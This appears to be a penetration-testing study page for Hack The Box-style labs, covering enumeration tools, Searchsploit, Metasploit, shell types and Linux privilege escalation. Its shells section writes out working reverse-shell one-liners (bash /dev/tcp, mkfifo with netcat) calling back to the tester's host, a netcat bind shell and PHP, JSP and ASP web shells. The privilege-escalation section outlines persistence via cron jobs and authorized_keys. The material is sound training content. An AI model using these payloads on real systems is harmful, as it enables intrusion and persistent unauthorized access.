# Getting started

Use this page for first-pass concepts, common tools, and early service checks.

Quick links:

* [File transfer](./#file-transfer)
* [Service enumeration](./#service-enumeration)
* [Web Enumeration](./#web-enumeration)
* [Types of shells](./#types-of-shells)
* [Privilege Escalation](./#privilege-escalation)

### Cheat sheets

| Cheat sheet                                                        | Focus                                          |
| ------------------------------------------------------------------ | ---------------------------------------------- |
| [Common ports](../../cheat-sheets/page-3.md)                       | Default ports and quick service lookup         |
| [TMUX](../../cheat-sheets/tmux.md)                                 | Session, window, and pane shortcuts            |
| [VIM](../../cheat-sheets/vim.md)                                   | Fast editing and navigation                    |
| [Nmap](../../cheat-sheets/nmap.md)                                 | Common scans, NSE scripts, and banner grabbing |
| [Searchsploit](../../cheat-sheets/searchsploit.md)                 | Local exploit search, review, and copy         |
| [Metasploit](../../cheat-sheets/metasploit.md)                     | Module search, checks, and session handling    |
| [SMB](../../cheat-sheets/smb.md)                                   | Share enumeration and access commands          |
| [SNMP](../../cheat-sheets/snmp.md)                                 | `snmpwalk` and community string checks         |
| [Gobuster](../../cheat-sheets/gobuster.md)                         | Directory and DNS brute-force commands         |
| [cURL](../../cheat-sheets/curl.md)                                 | Header checks and redirect handling            |
| [WhatWeb](../../cheat-sheets/whatweb.md)                           | Technology fingerprinting                      |
| [SSL/TLS certificates](../../cheat-sheets/ssl-tls-certificates.md) | Certificate details and names                  |
| [robots.txt](../../cheat-sheets/robots.txt.md)                     | Hidden paths and blocked content               |
| [Page source code](../../cheat-sheets/page-source-code.md)         | Comments, keys, fields, and client-side clues  |
| [HTTP status codes](../../cheat-sheets/http-status-codes.md)       | Quick result triage during web enumeration     |

### Workflows

* [WF-Service Enumeration](wf-service-enumeration.md)
* [WF-Web Enumeration](wf-web-enumeration/)
* [WF-Reverse Shell](wf-reverse-shell.md)
* [WF-Bind Shell](wf-bind-shell.md)
* [WF-Web Shell](wf-web-shell.md)
* [WF-Privilege Escalation](wf-privilege-escalation/)

## Foundations

### Shell

The shell takes user input and passes commands to the operating system to perform a specific function.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Port

Ports are virtual points where network connections begin and end.

They allow a computer to route different types of traffic simultaneously over a single network connection by mapping specific data streams to distinct software processes (e.g., SSH vs. web requests).

{% include "../../../.gitbook/includes/protocol-comparison-tcp-vs....md" %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Web server

Software running on a host machine that directly handles HTTP/HTTPS traffic from a client browser over TCP ports 80 and 443.

It processes incoming requests, maps them to physical files, or hands them off to the application backend. This creates a large attack surface.

Attack surface breakdown:

Web Server Vulnerabilities and Web Application Flaws (OWASP Top 10)

{% embed url="https://owasp.org/Top10/2025/" %}

## Access and terminal tools

### Using SSH

Secure Shell is a network protocol that runs on port 22 by default and provides users a secure way to access a computer remotely.

SSH can use password authentication or public-key authentication with a public and private key pair.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Netcat

Netcat, `ncat`, or `nc` is used to interact with TCP and UDP ports.

It can be used for many things during a pentest.

Its primary use is connecting to shells.

Netcat can connect to any listening port and interact with the service on that port.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Netcat can also be used to grab a banner from a target IP and port.

This is called banner grabbing.

Netcat can also be used to transfer files.

```bash
nc -nv <TARGET_IP> <TARGET_PORT>
```

Then there is also Socat, often called Netcat on steroids. A [standalone binary](https://github.com/andrew-d/static-binaries) of `Socat` can be transferred to a system after remote code execution to get a more stable reverse shell.

Socat also supports forwarding ports and connecting to serial devices.

1. **Port forwarding**

When you hack a target network, you often find a central server (like a database) that is completely hidden from the internet behind a firewall.

You cannot talk to it directly.

But if you have already compromised the public web server sitting right next to it, you can tell that web server: _"Take any traffic I send to you on port X, and automatically forward it to the hidden database on port Y."_

2. **Connecting to serial devices**

* **Serial devices**: Physical hardware components like routers, IoT devices, or microchips that transmit data sequentially, one bit at a time.
* **Security purpose**: Involves opening a device's casing, connecting a cable directly to diagnostic pins on the circuit board like UART, and using tools to read raw data or drop into a root command line without a network connection or password.

### File transfer

Use this section when you need to move scripts, binaries, or output between your machine and the target.

### Fast decision rules

* Use HTTP first when the target can reach your machine.
* Use `scp` when you already have valid SSH credentials.
* Use Base64 when direct network transfer is blocked.

#### Method 1 — Python HTTP server with `wget` or `curl`

This is the standard option.

Use it when your machine and the target can talk over the network.

Instead of pushing a file to the target, host it on your machine and let the target download it.

On your machine, start a temporary web server from the directory that holds the file:

```bash
python3 -m http.server 8000
```

On the target, download the file with `wget`:

```bash
wget http://<YOUR_IP>:8000/linenum.sh
```

If `wget` is missing, use `curl`:

```bash
curl http://<YOUR_IP>:8000/linenum.sh -o linenum.sh
```

{% hint style="info" %}
`curl` prints response data to the terminal by default. Use `-o` to save the file locally.
{% endhint %}

#### Method 2 — Secure Copy Protocol (`scp`)

Use this when you already have legitimate SSH credentials on the target.

Run the command from your machine:

```bash
scp linenum.sh user@<TARGET_IP>:/tmp/linenum.sh
```

Breakdown:

* `linenum.sh` — local file to send
* `user@<TARGET_IP>` — remote username and target IP
* `:/tmp/linenum.sh` — destination path on the target

#### Method 3 — Base64 copy and paste

Use this when a firewall blocks `wget`, `curl`, and `scp`, but you still have shell access.

Encode the file into plain text on your machine:

```bash
base64 shell -w 0
```

`-w 0` keeps the output on one line, which makes it easier to copy.

Copy the output string.

Then rebuild the file on the target:

```bash
echo '<BASE64_STRING>' | base64 -d > shell
```

#### Validate the transfer

Always verify the file before you run it.

**Check the file type**

```bash
file shell
```

Expected result for a Linux binary:

```
ELF 64-bit LSB executable
```

If the result says `ASCII text`, the transfer likely failed or downloaded an error page instead.

**Check the hash on both systems**

Run this on your machine:

```bash
md5sum shell
```

Run the same command on the target:

```bash
md5sum shell
```

If both hashes match exactly, the transfer completed without corruption.

### TMUX

Terminal multiplexers, like `tmux` or `Screen`, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them.

{% embed url="https://tmuxcheatsheet.com/" %}

### VIM

Vim is a great text editor that can be used for writing code or editing text files on Linux systems.

{% embed url="https://vimsheet.com/" %}

## Service enumeration

### Nmap

Nmap is used to scan ports and let us know the services that are running.

Basic Nmap scan. This checks the 1,000 most common ports and runs a TCP scan by default:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap <TARGET_IP>
```

We can use the `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. The `-sV` parameter instructs `Nmap` to perform a version scan. In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version. The version scan is underpinned by a comprehensive database of over 1,000 service signatures. Finally, `-p-` tells Nmap that we want to scan all 65,535 TCP ports.

<br>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sV -sC -p- <TARGET_IP>
```

* `-sV` → version detection
* `-sC` → run default scripts
* `-p-` → scan all 65,535 ports

### Nmap scripts

Specifying `-sC` will run many useful default scripts against a target, but there are cases when running a specific script is required.

```bash
nmap --script <SCRIPT_NAME> <TARGET_IP>
nmap --script ftp-anon <TARGET_IP>          # check anonymous FTP
```

```bash
nmap --script vuln <TARGET_IP>              # check known vulns
nmap --script ftp-anon <TARGET_IP>          # anonymous FTP check
nmap --script http-enum <TARGET_IP>         # web enumeration
nmap --script smb-vuln-ms17-010 <TARGET_IP> # EternalBlue check
```

## Attacking Network Services

### Banner grabbing

**Fingerprinting** = identifying exactly what is running on a target.

Like a human fingerprint — unique to each person. Every service leaves identifying information.

**Banner grabbing is one way to fingerprint:**

```bash
# Using Nmap
nmap -sV --script=banner <TARGET_IP>

# Using Netcat manually
nc -nv <TARGET_IP> 21

# Response:
220 (vsFTPd 3.0.3)
→ FTP server, version 3.0.3
```

Generic info → "FTP is running"\
Fingerprinted → "vsFTPd 3.0.3 is running"

Generic → can't find specific exploits\
Fingerprinted → Google "vsFTPd 3.0.3 CVE"\
→ find backdoor vulnerability\
→ exploit it

### FTP

`Nmap` scan of the default port for FTP (21) reveals the vsftpd 3.0.3 installation that we identified previously. Further, it also reports that anonymous authentication is enabled and that a `pub` directory is available.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

### SMB

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. `Nmap` has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -A -p<TARGET_PORT> <TARGET_IP>
```

This is an aggressive scan.

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

#### Why This Matters in Pentesting

The text is demonstrating the progression of enumeration. You start by finding an open port (`445`), then you use specialized tools (NSE scripts or `-A` flags) to pull the banners and exact software versions. Once you have those precise versions (e.g., _Windows 7 SP1_ or _Samba 4.6.2_), you can cross-reference them against public vulnerability databases to find specific, actionable exploits like EternalBlue.<br>

### Shares

* **SMB (Server Message Block)**: Protocol used to share folders and files remotely.
* **Security risk**: Shares frequently expose sensitive data like hardcoded passwords.
* **Tool (`smbclient`)**: Used to enumerate and interact with SMB shares from the command line.
  * `-L` lists all available shares on the target host.
  * `-N` suppresses the password prompt and forces an anonymous connection attempt.

Listing available shares:

```bash
smbclient -N -L \\\\<TARGET_IP>
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After finding a non-default share like `users`, we attempt to connect to it.

```bash
smbclient \\\\<TARGET_IP>\\<SHARE_NAME>
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If this fails, we need to find valid credentials elsewhere and then try again.

```bash
smbclient -U <USERNAME> \\\\<TARGET_IP>\\<SHARE_NAME>
```

After this, the tool asks for a password. Once inside the `smb: \>` prompt, it functions similarly to a basic FTP or Linux shell.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can now use the `get` command to download the `passwords.txt` file.

### SNMP

* **SNMP (ports 161/162 TCP/UDP)**: Used for device management.
* **Versions 1 and 2c**: Insecure. They rely on unencrypted plaintext community strings instead of passwords.
* **Default danger**: Default strings are almost always `public` for read or `private` for write.
* **Pentest value**: Leaks running processes, internal routing tables, and exact software versions.

#### `snmpwalk`

```bash
snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.2.1.1.5.0
```

* `snmpwalk`: A tool that sends sequential requests to "walk" through a device's management data tree.
* `-v 2c`: Specifies that it is using SNMP version 2c (the insecure, plaintext version).
* `-c public`: Supplies `public` as the community string (password).
* `<TARGET_IP>`: The target IP address.
* `1.3.6.1.2.1.1.5.0`: This OID points directly to the system's hostname.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

If the community string fails, use `onesixtyone` to brute-force it.

```bash
onesixtyone -c dict.txt <TARGET_IP>
```

* `onesixtyone`: A highly efficient, multi-threaded scanner built specifically to brute-force SNMP community strings.
* `-c dict.txt`: Passes a text file containing a dictionary of common community strings (e.g., `public`, `private`, `internal`, `manager`, `cisco`).

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Use this section for first-pass web checks and fast follow-up.

Start with the [WF-Web Enumeration](wf-web-enumeration/) flow.

### Gobuster

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing.

The tool has additional functionality, such as enumeration of public AWS S3 buckets.

#### Directory enumeration

```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

What it does:

* Takes every word from the wordlist.
* Tries `http://IP/word` for each one.
* Reports which ones exist with `200`, `301`, or `403`.

Example finding:

* Found `/wordpress` with `301`.
* WordPress is installed.
* WordPress often has a large attack surface.

#### DNS subdomain enumeration

```bash
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

What it does:

* Tries `blog.domain.com`, `admin.domain.com`, and similar names.
* Reports which subdomains actually exist.

Why it matters:

* admin panels on subdomains
* dev or staging environments
* hidden applications

Related cheat sheet:

* [Gobuster](../../cheat-sheets/gobuster.md)

### cURL - Web Server Headers

```bash
curl -IL https://www.inlanefreight.com
```

What it reveals:

* `Server: Apache/2.4.29 (Ubuntu)` and other version details
* technology stack hints
* authentication methods
* security misconfigurations

Flag reminder:

* `-I` requests headers only.
* `-L` follows redirects.

Related cheat sheet:

* [cURL](../../cheat-sheets/curl.md)

### WhatWeb - Technology Fingerprinting

```bash
whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24
```

What it reveals:

* web server such as Apache, Nginx, or IIS
* version numbers
* frameworks such as WordPress, PHP, or jQuery
* email addresses
* country data

Subnet use:

* Scan a whole `/24`.
* Find all web servers on the network at once.

Related cheat sheet:

* [WhatWeb](../../cheat-sheets/whatweb.md)

### SSL/TLS Certificates

Browse to `https://IP`.

Then click the padlock and view the certificate.

What it reveals:

* company name
* email addresses
* domain names
* phishing targets if that is in scope

Related cheat sheet:

* [SSL/TLS certificates](../../cheat-sheets/ssl-tls-certificates.md)

### robots.txt

Browse to `http://IP/robots.txt`.

What it reveals:

* paths search engines cannot index
* hidden admin pages
* private directories
* sensitive files

Example find:

```
Disallow: /private
```

Then browse to `/private`.

That may lead to an admin login page.

Related cheat sheet:

* [robots.txt](../../cheat-sheets/robots.txt.md)

### Page Source Code

Press `Ctrl+U` in the browser.

What to look for:

* developer comments with credentials
* hidden form fields
* hardcoded API keys
* internal IP addresses
* file paths that reveal server structure

Related cheat sheet:

* [Page source code](../../cheat-sheets/page-source-code.md)

### HTTP Status codes

* `200` — exists and is accessible
* `301` — redirect and still exists
* `302` — temporary redirect
* `401` — requires authentication
* `403` — exists but is forbidden
* `404` — does not exist
* `500` — server error

Related cheat sheet:

* [HTTP status codes](../../cheat-sheets/http-status-codes.md)

{% hint style="success" %}
### Key insight

WordPress found at `/IP/wordpress`

* WordPress is in setup mode.
* You may be able to configure it yourself.
* That can lead to remote code execution.
* One Gobuster result can lead to full server compromise.
{% endhint %}

## Public Exploits

After service fingerprinting, the next goal is to find public exploits that match the exact version.

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Searchsploit tip:** Use `-m` to copy an exploit into your current directory.

```bash
searchsploit -m linux/remote/45233.py
```

### Searchsploit

Installation:

```
sudo dnf install exploitdb -y
```

Usage:

```
searchsploit openssh 7.2
```

We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/).

#### Searchsploit technical flow

Use Searchsploit after service fingerprinting.

Start with a broad search.

Then narrow to the exact version.

```bash
nmap -sV -sC -p- <TARGET_IP>
searchsploit <SERVICE> <VERSION>
searchsploit -x <EDB_PATH>
searchsploit -m <EDB_PATH>
```

Useful flags:

* `-t` shows titles only.
* `-x` opens the exploit file for review.
* `-m` copies the exploit into the current directory.
* `--nmap scan.xml` maps an Nmap XML file to known exploits.

Related cheat sheet:

* [Searchsploit](../../cheat-sheets/searchsploit.md)

### Metasploit Primer

The Metasploit Framework is a core tool for pentesters.

It packages many public exploits and makes them easier to run against vulnerable targets.

* Reconnaissance & Enumeration: Includes auxiliary modules to scan ports, identify services, and discover active hosts.
* Vulnerability Verification: Offers `check` functions to safely confirm if a target is vulnerable without exploiting it.
* Advanced Payloads (Meterpreter): Provides an in-memory, highly stealthy runtime environment to run commands, inject processes, and manage sessions on a compromised target.
* Post-Exploitation & Pivoting: Features tools to harvest credentials, elevate privileges, and route traffic through a compromised machine to internal networks.

When configuring an exploit module (like `ms17_010_psexec` used in the text), two variables are almost universally required to route and establish the exploit payload successfully:

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
**Why checking matters:** Firing an exploit blindly can crash remote legacy services (like SMB or RDP), trigger Blue Screens of Death (BSOD) on production systems, or unnecessarily trip Intrusion Detection Systems (IDS).
{% endhint %}

The `check` command uses low-risk queries or auxiliary scanners to identify OS versions and service responses, validating the vulnerability before any intrusive payload code is actually executed.

#### Metasploit technical flow

Use Metasploit after you identify the service and version.

Search for a matching module.

Review the options before you run anything.

```bash
msfconsole
search <SERVICE> <VERSION>
use <MODULE>
show options
show payloads
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
check
run
```

Common post-run commands:

```bash
sessions
sessions -i <ID>
background
info
```

Related cheat sheet:

* [Metasploit](../../cheat-sheets/metasploit.md)

#### For practicing MSF

* Windows Targets (Great for SMB/IIS practice): _Blue_, _Legacy_, _Granny_, _Grandpa_, _Jerry_, _Optimum_, _Devel_.
* Linux Targets (Great for legacy network services): _Lame_.

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

## Types of shells

Use shell workflows after you get code execution.

They turn one exploit path into usable access.

### Shell workflows

* [WF-Reverse Shell](wf-reverse-shell.md)
* [WF-Bind Shell](wf-bind-shell.md)
* [WF-Web Shell](wf-web-shell.md)

### Access paths

After compromise, you usually keep access in one of two ways:

1. **Legitimate remote access protocols**
2. **Interactive shells**

#### Legitimate remote access protocols

Use these when you recover valid credentials.

Common options:

* `SSH`
* `WinRM`

#### Interactive shells

Use these when you need command execution without stable remote login access.

A payload usually hooks into `/bin/bash`, `cmd.exe`, or `powershell.exe`.

### Main shell types

| Shell type        | Connection direction                                 | Key advantage                                                            | Major drawback                                         |
| ----------------- | ---------------------------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------ |
| **Reverse shell** | Target dials out to attacker.                        | Bypasses most strict inbound firewall rules.                             | Fragile. If the connection drops, you must re-exploit. |
| **Bind shell**    | Attacker dials in to target.                         | If your connection drops, you can reconnect immediately.                 | Modern firewalls usually block the new inbound port.   |
| **Web shell**     | No persistent connection. Request and response only. | Blends into normal web traffic on `80` or `443`. Often survives reboots. | Completely non-interactive and stateless.              |

### The reverse shell blueprint

Use a reverse shell when the target can connect back to you.

It is usually the best default option during exploitation.

Start with [WF-Reverse Shell](wf-reverse-shell.md).

You can also use [Payload All The Things reverse shell references](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) to find a fitting payload.

#### The Netcat listener

Before you execute a reverse shell on the target, your machine must be ready to catch it.

```bash
nc -lvnp 1234
```

* `-l` — listen mode
* `-v` — verbose output
* `-n` — numeric only and no DNS lookup
* `-p` — local listening port

{% hint style="warning" %}
**Critical check:** Use your VPN IP from the `tun0` interface when writing the payload. Do not use your local `eth0` address. Hack The Box targets can only connect back through the VPN tunnel.
{% endhint %}

#### Reliable one-liners

**Linux — Bash**

```bash
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'
```

**Linux — named pipe**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f
```

**Windows — PowerShell**

Use a `.Net.Sockets.TCPClient` payload to stream terminal input and output over a raw socket back to your machine.

### The bind shell blueprint

Use a bind shell when the target can expose a reachable listening port.

Instead of catching a connection, you force the target to host the shell and wait for you.

Start with [WF-Bind Shell](wf-bind-shell.md).

You can also use [Payload All The Things bind shell references](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a fitting payload.

#### Reliable one-liners

**Linux — Netcat bind**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

**Linux — Python bind**

Use a Python inline loop that binds to `0.0.0.0` and exposes a shell on the target.

**Windows — PowerShell bind**

Use a `TcpListener` object on the target machine to wait for your inbound connection.

#### Connect to it

```bash
nc <TARGET_IP> <BIND_PORT>
```

### The TTY upgrade cheat sheet

When you first catch a shell over Netcat, it is usually a dumb shell.

Tab completion, arrow keys, and screen clearing usually do not work.

Use this exact flow to upgrade a Linux shell to a stable TTY.

```bash
# Step 1: inside the raw Netcat shell, spawn a PTY shell using Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: press Ctrl+Z to background the Netcat session

# Step 3: on your local terminal, switch to raw mode and disable echo
stty raw -echo

# Step 4: bring the Netcat session back to the foreground, then press Enter twice
fg

# Step 5: fix terminal settings inside the upgraded shell
export TERM=xterm-256color
stty rows <YOUR_ROWS> columns <YOUR_COLS>
```

To get the right `rows` and `columns`, run `stty size` in a normal local terminal first.

You can check your terminal type with `echo $TERM`.

### The web shell blueprint

Use a web shell after file upload, write access to the webroot, or web-based remote code execution.

It works as a command bridge over HTTP or HTTPS.

Start with [WF-Web Shell](wf-web-shell.md).

#### Native language one-liners

**PHP**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**JSP**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP**

```asp
<% eval request("cmd") %>
```

#### Default webroots

If you already have remote code execution, drop the file in the directory the web server actually serves.

* **Apache on Linux** — `/var/www/html`
* **Nginx on Linux** — `/usr/local/nginx/html`
* **IIS on Windows** — `C:\inetpub\wwwroot\`
* **XAMPP** — `C:\xampp\htdocs\`

#### Interact with it

Use `curl` or the browser to send commands without keeping a persistent session.

```bash
curl http://<SERVER_IP>:<PORT>/shell.php?cmd=id
```

### Fast decision rules

* Use a reverse shell first when outbound traffic works.
* Use a bind shell only when the port is reachable from your machine.
* Use a web shell as a bridge to a better shell.
* Upgrade a raw Linux shell early.

## Privilege Escalation

Start with [WF-Privilege Escalation](wf-privilege-escalation/).

### The privilege escalation mindset

When you first compromise a box, your access is usually restricted.

To gain more control, switch from external enumeration to local enumeration.

```
[Initial Access: Low-Privilege User] --( Local Enumeration )--> [Identify Misconfiguration/Flaw] --( Exploitation )--> [Root / SYSTEM Access]
```

### Enumeration frameworks and scripts

Before you escalate privileges, collect data about the local operating system configuration.

You can do this manually or speed it up with purpose-built scripts.

#### The trade-off: automation vs noise

{% hint style="warning" %}
Automated enumeration scripts run thousands of fast system commands. That creates heavy noise and can trigger EDR, AV, or SIEM alerts. In stealth-sensitive environments, prefer manual enumeration.
{% endhint %}

#### Key tools matrix

| Resource / tool                | Operating system  | Purpose / details                                                                                                                           |
| ------------------------------ | ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **HackTricks**                 | Linux and Windows | Industry-standard online checklist repository for local vulnerability checks.                                                               |
| **PayloadsAllTheThings**       | Linux and Windows | Large GitHub repository with cheatsheets and payloads for local bypasses.                                                                   |
| **LinPEAS / WinPEAS**          | Linux / Windows   | Part of the PEASS Suite. Highlights likely vectors with color-coded output. Red or yellow often signals a strong privilege escalation lead. |
| **LinEnum / linuxprivchecker** | Linux             | Legacy lightweight scripts for auditing the local system environment.                                                                       |
| **Seatbelt / JAWS**            | Windows           | Specialized tools for reviewing security settings, patch levels, and running processes.                                                     |

### Common privilege escalation vectors

Focus on the areas where misconfigurations and local flaws appear most often.

#### A. Kernel exploits

**Mechanism:** The operating system kernel is outdated and missing security patches.

A low-privilege process may exploit kernel memory handling flaws to gain higher privileges.

Example:

* Linux `3.9.0-73-generic` is a well-known target for DirtyCOW, `CVE-2016-5195`.

{% hint style="warning" %}
Kernel exploits carry high risk. They can crash the host or trigger kernel panic or BSOD conditions. Do not use them on production systems without explicit approval and prior testing.
{% endhint %}

#### B. User privileges and sudo rights

**Mechanism:** Administrators allow specific users to run selected binaries with elevated privileges through `sudo`.

Verification:

```bash
sudo -l
```

That command shows which binaries the current user can run with elevated rights.

Exploitation hubs:

* **GTFOBins** for Linux — shows how to abuse legitimate binaries such as `echo`, `tcpdump`, or `find` when `sudo` or `SUID` access is present.
* **LOLBAS** for Windows — catalogs native living-off-the-land binaries that can execute commands or download files in privileged contexts.

#### C. Scheduled tasks and cron jobs

**Mechanism:** The system runs scheduled tasks under the context of `root` or `SYSTEM`.

These tasks often execute scripts or binaries at fixed intervals.

**Vector 1 — direct write**

If a low-privileged user can write to task configuration paths such as `/etc/crontab` or `/etc/cron.d`, they can add a new task that triggers a reverse shell.

**Vector 2 — file hijacking**

If an existing cron job runs a custom script from a writable path, overwrite that script with your own commands.

#### D. Exposed credentials and password reuse

**Mechanism:** Administrators and developers sometimes leave plaintext credentials in config files, logs, or shell history.

Common places include `.bash_history`, application config files, and PowerShell history such as `PSReadLine`.

Exploitation path:

If you recover a password from a file like `/var/www/html/config.php`, test it for password reuse immediately.

Common next steps:

* switch users locally with `su -`
* try network logins such as `ssh`
* test whether the same password unlocks a more privileged account

#### E. SSH key manipulation

**Vector 1 — read access**

If a low-privileged user can read another user's private key, copy it and use it to authenticate directly.

```bash
chmod 600 id_rsa
ssh root@<TARGET_IP> -i id_rsa
```

Private keys must have restrictive `600` permissions locally or the SSH client rejects them as unsafe.

**Vector 2 — write access**

If you control a user account and can write to their `.ssh/` directory, generate a fresh key pair and append your public key to `authorized_keys`.

That gives you clean and persistent access without relying on a password.
